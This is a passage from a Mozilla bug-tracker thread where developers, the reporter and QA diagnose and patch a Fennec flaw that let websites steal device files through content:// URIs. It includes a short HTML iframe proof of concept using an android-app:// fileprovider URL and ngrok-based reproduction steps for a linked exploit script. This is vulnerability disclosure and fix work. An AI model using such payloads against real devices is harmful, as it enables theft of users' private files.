|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1647078#c15)• 5 years ago |
|  | |

The above comment is valid only if you don't address the replacement problem in content URI downloads.

If you address that, there is no way this attack can be achieved.

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1647078#c16)• 5 years ago |
|  | |

Possibly related to / more hints in <https://bugzilla.mozilla.org/show_bug.cgi?id=1516467>

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1647078#c17)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14902400 "1 revision") |
|  | |

I think this regression was introduced by <https://bugzilla.mozilla.org/show_bug.cgi?id=1499618>

which in turn seemed to be a regression from <https://bugzilla.mozilla.org/show_bug.cgi?id=1406903>

which is "cannot view files using content:// scheme"

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1647078#c18)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14902433 "2 revisions") |
|  | |

Given the short timeframe we have towards Fennec 68.11 I want to suggest three options:

* We remove support for `content://`. Not just from the manifest and through the `VIEW` intent, but also from the code introduced by 1406903 and 1499618
* We remove just the code introduced by [bug 1499618](/show_bug.cgi?id=1499618 "RESOLVED FIXED - Crash in java.lang.IllegalArgumentException: at android.database.AbstractCursor.getColumnIndexOrThrow(AbstractCursor.java)") since that is probably the culprit here, trying to be smart about content urls, and doing the actual file copy to a temporary file which is then served.
* We fix this properly. Keeping the existing functionality but putting proper URL santization and whatever else needed on the handling of content:// URIs

Considering the future of Fennec, my personal preference would be the first option. But it may also be the most risky one since it may touch a lot of code. Although mostly removal probably.

Let's try to make a decision soon. It is not entirely clear what path to take.

|  | [Kevin Brosnan [Ex-Mozilla]](/user_profile?user_id=406670) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1647078#c19)• 5 years ago |
|  | |

I don't love the idea of removing `content:` URIs globally. This is the modern way of passing data between apps. Android 7.0 switched to content: being the way to reference local files. <https://developer.android.com/about/versions/nougat/android-7.0-changes#sharing-files>

[Bug 1375035](/show_bug.cgi?id=1375035 "RESOLVED DUPLICATE - Add support for opening .html files") provides a fairly common example of how content: uris are used in Android. Passing an attachment from email apps.

JanH could be a good person to talk to about this.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1647078#c20)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14902557 "1 revision") |
|  | |

Removing `content:` globally probably not , but we should restrict it severely, similar to `file:`, right now it looks like it's completely unrestricted.

Looks like Fenix doesn't support this case FWIW, so unless we plan to implement it soon this functionality will go away anyway.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1647078#c21)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14902567 "1 revision") |
|  | |

I think what we should do here is reject any attempt to load from `content://` URIs from in-content, leaving top-level as the only way to load a `content://` URIs. So top-level HTML/images etc will still load in Fennec but all sub-resources will be broken.

|  | [David Bolter [:davidb] (NeedInfo me for attention)](/user_profile?user_id=152868) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a455580_152868)• 5 years ago |

Flags: needinfo?(snorp)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1647078#c22)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14902919 "1 revision") |
|  | |

Apologies if this is a dumb question, I don't normally work on our mobile apps. But why is web content allowed to navigate to `android-app:` protocol URIs? Is that required for web compat, even without user interaction? And even if we do need it, can we at least block the ones pointing to our own app's `content:` URL provider?

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1647078#c23)• 5 years ago |
|  | |

Attached file
[Bug 1647078 - Load content:// URIs from intents as file://.](attachment.cgi?id=9159562)
— [Details](attachment.cgi?id=9159562&action=edit)

This change intercepts intents that try to load a content:// URI, copy the

content to a file and then open that file:// in the browser.

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a467513_600971)• 5 years ago |

Assignee: nobody → agiStatus: NEW → ASSIGNED

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1647078#c24)• 5 years ago |
|  | |

Attached file
[Bug 1647078 - Never handle content:// channels from Web.](attachment.cgi?id=9159563)
— [Details](attachment.cgi?id=9159563&action=edit)

This patch forbids loading content:// URIs coming from web content. If a web

page tries to load a content:// url in a sub-resource (like an image, script or

iframe) the browser will return an unknown protocol error.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1647078#c25)• 5 years ago |
|  | |

Attached file
[Bug 1647078 - Use random file names when copying a content:// URI.](attachment.cgi?id=9159564)
— [Details](attachment.cgi?id=9159564&action=edit)

When copying a content:// URI to a temp file we will use a random file name

instead of the actual file name of the resource to avoid name clashing.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1647078#c26)• 5 years ago |
|  | |

Attached file
[Bug 1647078 - Always copy content:// files.](attachment.cgi?id=9159565)
— [Details](attachment.cgi?id=9159565&action=edit)

This patch makes it so we never attempt to load a content:// URI by guessing

it's file location, and instead always open a copy.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1647078#c27)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14902934 "1 revision") |
|  | |

(In reply to :Gijs (he/him) from [comment #22](/show_bug.cgi?id=1647078#c22 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> Apologies if this is a dumb question, I don't normally work on our mobile apps. But why is web content allowed to navigate to `android-app:` protocol URIs? Is that required for web compat, even without user interaction? And even if we do need it, can we at least block the ones pointing to our own app's `content:` URL provider?

`android-app:` links are the way web pages open an app instead of a web page when navigating to them. We can definitely restrict them to user-interaction-only, and I think Fenix does that already.

Also you're correct into thinking that `android-app:` should never open Firefox itself, just external apps (and we should probably check that for Fenix?). Although the same attack can be carried over by a local app on the device, which is still pretty bad.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1647078#c28)• 5 years ago |
|  | |

The patches that I've attached to this add some hardening of the `content://` handling in Fennec. We don't have to take them all, we can also just disable the `content://` protocol outright by just taking [this one](https://phabricator.services.mozilla.com/D81254) (plus not responding to the content:// protocol at all in the manifest).

These are the steps that the above patches take:

* The file name is a secure-random UUID, so name clashing or resource spoofing is not possible anymore
* We always open a `content://` URI to a temporary file, never in the actual location, so that the page cannot request additional resource from protected folders
* We only accept `content://` URIs from intents, and we immediately translate them to the copied-over file:// URL. This ensures that sub-resources cannot load `content://` URIs (like scripts, images, iframes). This also means that loading html files only works for plain HTML, all subresources won't be loaded. This is not actually a big loss, since on modern android versions this is basically what happens anyway.
* We double check that we're not trying to load a `content://` URI in the external protocol handler, and if that happens we just reject the load without asking Fennec.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1647078#c29)• 5 years ago |
|  | |

TL;DR After these changes the user can still open attachments from other apps, including HTML files but none of the attack vectors are present anymore. Subresources like images, scripts and iframes from HTML files won't load at all.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1647078#c30)• 5 years ago |
|  | |

One thing I haven't looked at yet is whether an app can still trick Fennec into producing a `content://` intent for internal data.

|  | [Petru-Mugurel Lingurar [:petru]](/user_profile?user_id=613831) |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1647078#c31)• 5 years ago |
|  | |

The way I see it, I don't really think this ^^ is a possibility anymore.

After the patches here an app could still start fennec with a `content://` or `file` Intent data (while websites could not anymore) to open a specific file. It could even be an internal storage file.

It could even be the html disguised as profile.ini from here. And we needed this behavior for relatively common usecases like loading/opening device files with Fennec.

I think previously `content://` Intents would've probably even worked for overwriting contentUri files. Now with random filenames this isn't possible anymore.

The biggest find in this report is though how through nested htmls(iframes) and by leveraging the overwriting we did in contentUri directory one cleverly designed script could overwrite with and then most importantly extract that data of private files.

After the changes from the patches here to not handle `content://` uris requests from the web I don't see any possibility of extracting the data.

|  | [Petru-Mugurel Lingurar [:petru]](/user_profile?user_id=613831) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a497539_613831)• 5 years ago |

Flags: needinfo?(petru.lingurar)

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1647078#c32)• 5 years ago |
|  | |

I see that the Content Provider configuration XML was not addressed. It is still exposing the root folder of the device. This can potentially lead to security issues. Is this expected?

|  | [Petru-Mugurel Lingurar [:petru]](/user_profile?user_id=613831) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1647078#c33)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14903516 "1 revision") |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #6](/show_bug.cgi?id=1647078#c6 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> so what is this content:// scheme? it's like file:// but worse, and none of the special-cased code that protects file:// from web content. what other non-web internal schemes does Fennec support and expose to web content?

Actually is should be like `file://` but better. After Android 7.0 exposing files through the `file://` scheme is discouraged ([Android changelog](https://developer.android.com/about/versions/nougat/android-7.0-changes.html#perm)).

The `content` scheme is of the essence here because of how that is handled inside the app: Because it's real source is not known, may not even be a resource on disk, we cache that as a File on disk in the contentUri directory in app's internal storage and then open that inside of Fennec.

If another request is made to load another content uri which would resolve to the same File name the already existing one in the contentUri private directory would get overwritten. And if someone was to already have a reference to that initial File it would get the new content.

|  | [Petru-Mugurel Lingurar [:petru]](/user_profile?user_id=613831) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1647078#c34)• 5 years ago |
|  | |

(In reply to kanytu from [comment #32](/show_bug.cgi?id=1647078#c32 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> I see that the Content Provider configuration XML was not addressed. It is still exposing the root folder of the device. This can potentially lead to security issues. Is this expected?

I think this is the expected behavior.

Until now there was not a clear indication of how private data could be extracted from Fennec.

It can open any files, yes, but only for the user's eyes.

Only with your report we got a scenario in which a rogue website could extract private Fennec data.

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1647078#c35)• 5 years ago |
|  | |

Petru, what would regress if we change the root folder to the suggested `/storage/` ? I don't have a good feeling about this `.` there, which I assume means the root of Firefox. If we don't have a good reason for this, then I would suggest to change it to `/storage/`?

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a513452_388264)• 5 years ago |

Flags: needinfo?(petru.lingurar)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1647078#c36)• 5 years ago |
|  | |

(In reply to Stefan Arentz [:st3fan] from [comment #35](/show_bug.cgi?id=1647078#c35 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> Petru, what would regress if we change the root folder to the suggested `/storage/` ? I don't have a good feeling about this `.` there, which I assume means the root of Firefox. If we don't have a good reason for this, then I would suggest to change it to `/storage/`?

My understanding is that will break opening Downloads for people that moved their download folder in a non-standard location. From what I can see this is only an `about:config` option?

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1647078#c37)• 5 years ago |
|  | |

(In reply to kanytu from [comment #32](/show_bug.cgi?id=1647078#c32 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> I see that the Content Provider configuration XML was not addressed. It is still exposing the root folder of the device. This can potentially lead to security issues. Is this expected?

That's what I meant with [Comment 30](/show_bug.cgi?id=1647078#c30 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"), I'm looking into that right now :)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1647078#c38)• 5 years ago |
|  | |

(In reply to Agi Sferro | :agi | ⏰ PST | he/him from [comment #36](/show_bug.cgi?id=1647078#c36 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> (In reply to Stefan Arentz [:st3fan] from [comment #35](/show_bug.cgi?id=1647078#c35 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))
>
> > Petru, what would regress if we change the root folder to the suggested `/storage/` ? I don't have a good feeling about this `.` there, which I assume means the root of Firefox. If we don't have a good reason for this, then I would suggest to change it to `/storage/`?
>
> My understanding is that will break opening Downloads for people that moved their download folder in a non-standard location. From what I can see this is only an `about:config` option?

actually it would only break it for people who moved their Download folder to an internal Firefox folder? that seems pretty unusual.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1647078#c39)• 5 years ago |
|  | |

That's what I said in <https://bugzilla.mozilla.org/show_bug.cgi?id=1647078#c4>

No file manager would give the option to choose an internal folder. For removable sdcards, their path always start with `/storage/` too.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1647078#c40)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14903982 "1 revision") |
|  | |

(In reply to Stefan Arentz [:st3fan] from [comment #35](/show_bug.cgi?id=1647078#c35 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> Petru, what would regress if we change the root folder to the suggested `/storage/` ? I don't have a good feeling about this `.` there, which I assume means the root of Firefox. If we don't have a good reason for this, then I would suggest to change it to `/storage/`?

`root-path` is actually the root of the device (and from what I can see it's an undocumented option). So it's actually worse than you think.

(In reply to kanytu from [comment #39](/show_bug.cgi?id=1647078#c39 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> That's what I said in <https://bugzilla.mozilla.org/show_bug.cgi?id=1647078#c4>
>
> No file manager would give the option to choose an internal folder. For removable sdcards, their path always start with `/storage/` too.

oh I see, sorry I'm still processing all of this, thanks! The user can still type the folder out in `about:config` even if they don't have access to it but yeah, not really a use case.

|  | [Petru-Mugurel Lingurar [:petru]](/user_profile?user_id=613831) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1647078#c41)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14903990 "1 revision") |
|  | |

My understanding is the same as Agi's.

There is a very small possibility that some users set (through about:config which I wasn't able to, we can test more if needed) their downloads folder to be in some other location that the external storage - what normal users see as storage - device or sdcard.

`<root-path name="root" path="."/>` normal users, not even root users could use fennec's internal storage + any external storage mediums.

`<root-path name="root" path="/storage/"/>` would mean any external storage - device memory + sdcard, USB OTG drives, etc.

Flags: needinfo?(petru.lingurar)

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1647078#c42)• 5 years ago |
|  | |

> root-path is actually the root of the device (and from what I can see it's an undocumented option). So it's actually worse than you think.

It is not documented because it is known to be commonly misused. You can check the source code for Android's FileProvider [here](https://cs.android.com/androidx/platform/frameworks/support/%2B/androidx-master-dev%3Acore/core/src/main/java/androidx/core/content/FileProvider.java;l=346?q=fileprovider)

The `root-path` element points to `File("/")` . Similar to a `~`. It is literally the root of the device.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1647078#c43)• 5 years ago |
|  | |

Attached file
[Bug 1647078 - Restrict content:// paths to external storage.](attachment.cgi?id=9159742)
— [Details](attachment.cgi?id=9159742&action=edit)

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1647078#c44)• 5 years ago |
|  | |

Agi do you think we should land all the patches attached to this bug? Can you add Petru as a reviewer and I will find another person to take a look?

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1647078#a531135_388264)• 5 years ago |

Flags: needinfo?(agi)

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1647078#c45)• 5 years ago |
|  | |

This is unrelated to this issue but after setting up TOTP to access Phabricator, I can't use any action that requires an TOTP. I always get an "Invalid verification code." message. I've tried changing the device time to PST but it doesn't seem to help either. I'm afraid I might be locked out and lose track of this issue if my session expires.

I'm not sure if that TOTP thing is a known issue but if not, and to avoid being locked out, what can I do continue tracking this issue and not lose the account?

|  | [Kevin Brosnan [Ex-Mozilla]](/user_profile?user_id=406670) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=1647078#c46)• 5 years ago |
|  | |

I would try reaching out to the Moz Phabricator folks at <https://chat.mozilla.org/#/room/#conduit:mozilla.org> and explain the situation.

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=1647078#c47)• 5 years ago |
|  | |

Attached file
[Bug 1647078 - Don't load Web-originated intents that open in the browser.](attachment.cgi?id=9159814)
— [Details](attachment.cgi?id=9159814&action=edit)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=1647078#c48)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14904906 "1 revision") |
|  | |

(In reply to Stefan Arentz [:st3fan] from [comment #44](/show_bug.cgi?id=1647078#c44 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"))

> Agi do you think we should land all the patches attached to this bug? Can you add Petru as a reviewer and I will find another person to take a look?

If we want to keep opening `content://` links (like email attachments), then yes. Will add Petru as reviewer.

Also I just noticed while looking into this, that our handling of `android-app` also allows [Bug 1356893](/show_bug.cgi?id=1356893 "VERIFIED FIXED - Firefox for Android allows navigating from http: to file: URLs") to happen. So I added a fix for that too. E.g. something like this navigates to a file URL (even after the fixes) (substitute `org.mozilla.firefox` with the app name)

```
<html>
<body>
  <iframe src="android-app://org.mozilla.firefox/content/org.mozilla.firefox.fileprovider/storage/emulated/0/Download/noscript_data.txt#Intent;type=text/html;end"></iframe>
</body>
</html>

```

for current Fennec substitute the url to: `android-app://org.mozilla.firefox/content/org.mozilla.firefox.fileprovider/root/storage/emulated/0/Download/noscript_data.txt#Intent;type=text/html;end`.

Flags: needinfo?(agi)

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=1647078#c49)• 5 years ago |
|  | |

After we're done fixing this I want to compile a list of checks that we should run on Fenix to make sure we're not doing any of this bad stuff there.

|  | [Kevin Brosnan [Ex-Mozilla]](/user_profile?user_id=406670) |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=1647078#c50)• 5 years ago |
|  | |

We don't accept `content:` or `file:` in the Fenix manifest. <https://github.com/mozilla-mobile/fenix/blob/master/app/src/main/AndroidManifest.xml>

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=1647078#c51)• 5 years ago |
|  | |

I'm gonna push to try as soon as it reopens (squashing the patches and replacing the commit message).

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=1647078#c52)• 5 years ago |
|  | |

<https://treeherder.mozilla.org/#/jobs?repo=try&revision=07fad090f7773ac26c6f1390bbdbeda9d2a29c70>

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=1647078#c53)• 5 years ago |
|  | |

Diana, can QA pick up the above build and do testing around downloads and opening html file from other apps or storage?

Kevin, can you identify some more concrete tests or areas that we should cover?

Flags: needinfo?(kbrosnan)Flags: needinfo?(diana.rus)

|  | [Petru-Mugurel Lingurar [:petru]](/user_profile?user_id=613831) |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=1647078#c54)• 5 years ago |
|  | |

The patches from Agi look awesome!

We'll have an a lot tighter control over who and how uses the `content://` scheme leaving a lot less room for abuse.

Regarding the proposed scenario to test the exploit:

I tried along with Diana to test using the proposed STRs:

> * ngrok http 8080
> * python3 server.py xxxx.ngrok.io 8080
> * fennec → <http://xxxx.ngrok.io>

but we couldn't get the js alert with the cookies in plain on any device that we tested on.

In fact, based on ngrok web interface we never get past the `generateProfiles` method.

It may be that there's something needed to be changed in `server.py`.. will investigate a bit.

Curious if others managed to reproduce this, to better assess it's incidence.

Will let Diana present her conclusions.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=1647078#c55)• 5 years ago |
|  | |

Hey @petru,

Regarding your comment, you're trying to test that with or without the fix?

Also, make sure you delete the cookies and profile.ini file from the downloads folder before each test. Otherwise, Fennec will rename the file to another one and the exploit wont work.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=1647078#c56)• 5 years ago |
|  | |

One more thing, as per `server.py`, line 20, don't include a scheme (`http://`) in your parameter. I'm already concatenating a scheme in it.

I had no troubles triggering the inner `iframe` but if you do, change them to something like `<iframe src="http://NGROK_SERVER/generateProfiles"></iframe>`

|  | [Diana Rus](/user_profile?user_id=636695) |  |
| --- | --- | --- |
| [Comment 57](/show_bug.cgi?id=1647078#c57)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14908346 "1 revision") |
|  | |

Hi, I didn't managed to reproduce the issue on Firefox Release 68.9.0 (from playstore) with Sony Xperia Z5 (Android 7), Samsung Galaxy S9 (Android 8) nor with Google Pixel 3 XL (Android 9), I managed to trigger the download but the javascript error wasn't present, please check [video](https://drive.google.com/file/d/1yBTvDRILpjcMg4tXuCJwWtIY4_0qhAlX/view?usp=sharing) and [settings](https://drive.google.com/file/d/1qDMK73uyeC5NYptUkVUAmwvSxrPdQzg1/view?usp=sharing).

Note:

On the try build (more exactly the build from Android 4.0 API16+ Release opt )i had the following outcome present after doing the steps from description [image of the saved file contents](https://drive.google.com/file/d/1Gfqlk-ppL-D1U7BaCrRHy-eSVxOhcQDT/view?usp=sharing).

After accessing a ngrok.io link the first outcome was that a download of the profiles.ini was triggered and afterwards a redirection to Play Store was present.

The iframe remains open in the browser, URL displays the ngrok.io link.

Flags: needinfo?(diana.rus)

|  | [Diana Rus](/user_profile?user_id=636695) |  |
| --- | --- | --- |
| [Comment 58](/show_bug.cgi?id=1647078#c58)• 5 years ago |
|  | |

Hi, re-checked on Firefox Release 68.9.0 ,based on [Comment55](/show_bug.cgi?id=1647078#c55 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known") (no second download of the file neither cookies) with Samsung Galaxy S9 (Android 8) and Google Pixel 3 XL (Android 9) - [video](https://drive.google.com/file/d/1I1kods_m6zKDnKJqJbN3Zd2PmOKu_lLF/view?usp=sharing)

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 59](/show_bug.cgi?id=1647078#c59)• 5 years ago |
|  | |

Hey Diana,

I've attached a new `server.py`. I simplified the logic a log. This now only steals `profile.ini` which should be enough for the test.

Could you please try with the same steps?

<https://drive.google.com/drive/folders/1dBzRgpiEKwqSiLANaQC4-pDUx10vmJdD?usp=sharing>

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 60](/show_bug.cgi?id=1647078#c60)• 5 years ago |
|  | |

Do we need the exploit code hosted somewhere more permanently? I can put it online on a server if that helps.

|  | [Petru-Mugurel Lingurar [:petru]](/user_profile?user_id=613831) |  |
| --- | --- | --- |
| [Comment 61](/show_bug.cgi?id=1647078#c61)• 5 years ago |
|  | |

Thank you @kanytu!

The new script makes it easy to see how a webpage could extract internal storage files content from Fennec.

<https://drive.google.com/file/d/1lOi_fAATehvthAjS-6nwEC3ikOu8Zb49/view?usp=sharing>

We can now easily test the fix for this and then that all else work as expected.

|  | [Diana Rus](/user_profile?user_id=636695) |  |
| --- | --- | --- |
| [Comment 62](/show_bug.cgi?id=1647078#c62)• 5 years ago |
|  | |

Hi, yes as Petru's mentioned, i also reproduce [video](https://drive.google.com/file/d/1YhiLtjSkGJclMnBQs8wq_h0Nv5zRSgtC/view?usp=sharing).

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 63](/show_bug.cgi?id=1647078#c63)• 5 years ago |
|  | |

This apk can be used to test the fix <https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/TV8MdQOtR1e8k4OKO6b_PQ/runs/0/artifacts/public/build/target.apk>

|  | [Diana Rus](/user_profile?user_id=636695) |  |
| --- | --- | --- |
| [Comment 64](/show_bug.cgi?id=1647078#c64)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14908629 "1 revision") |
|  | |

After checking with Samsung Galaxy S9 (Android 8) and Google Pixel 3XL (Android 9) on try build from [Comment 63](/show_bug.cgi?id=1647078#c63 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known") with same str.

[Video-Samsung](https://drive.google.com/file/d/1Zk6vPuDvzl_cW0oaH676MzpziJjOhF3o/view?usp=sharing)

[Video-Pixel 3 XL](https://drive.google.com/file/d/1S8Wm76DZgYdEAXsbDcixyrs2qwT0ElN-/view?usp=sharing)

After accessing the ngrok.io link, profiles.ini file starts downloading, the navigation bar contains the ngrok.io link and the "Open with" android notification is displayed.

|  | [Pedro Oliveira](/user_profile?user_id=665275)  Reporter |  |
| --- | --- | --- |
| [Comment 65](/show_bug.cgi?id=1647078#c65)• 5 years ago |
|  | |

I am unable to replicate this attack in the new APK. I'm pretty sure this exploit has been eradicated by using random names and restricting he content provider's access to private files.

|  | [Stefan Arentz | :st3fan | ⏰ EST | he/him](/user_profile?user_id=388264) |  |
| --- | --- | --- |
| [Comment 66](/show_bug.cgi?id=1647078#c66)• 5 years ago |
|  | |

Agi mentioned the following on Slack

> it would be nice if we could get some regression testing around opening attachments from email apps (like html pages) and opening downloads (both in Fennec and in other apps)

|  | [Diana Rus](/user_profile?user_id=636695) |  |
| --- | --- | --- |
| [Comment 67](/show_bug.cgi?id=1647078#c67)• 5 years ago |
|  | |

Hi, checked with Samsung Galaxy S9 (Android 8) and Google Pixel 3 XL (Android 9) on build from [Comment63](/show_bug.cgi?id=1647078#c63 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known"):

* moved Firefox Download folder from where initial is, to org.mozilla.firefox same outcome is present as when the Download's folder path is not changed([Comment64](/show_bug.cgi?id=1647078#c64 "VERIFIED FIXED - content:// provider allows websites to remotely steal any file from the device if the path is known")) - no crash encountered

  The path where the file is saved "/storage/emulated/0/Downloads/profiles.ini".
* opened attachments from mail (http, https pages, html page with iframe through custom tab and directly in browser)
* opened files from file://storage/emulated/0/Download/ (images-png, jpg, html)

  Verified also opening files from download in Fenix, no crashes or other problems encountered at opening of downloaded files..

|  | [[ex-Mozilla] Agi Sferro | :agi](/user_profile?user_id=421286)  Assignee |  |
| --- | --- | --- |
| [Comment 68](/show_bug.cgi?id=1647078#c68)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1647078&comment_id=14910966 "2 revisions") |
|  | |

Comment on [attachment 9159562](/attachment.cgi?id=9159562 "Bug 1647078 - Load content:// URIs from intents as file://.") [[details]](/attachment.cgi?id=9159562&action=edit "Bug 1647078 - Load content:// URIs from intents as file://.")

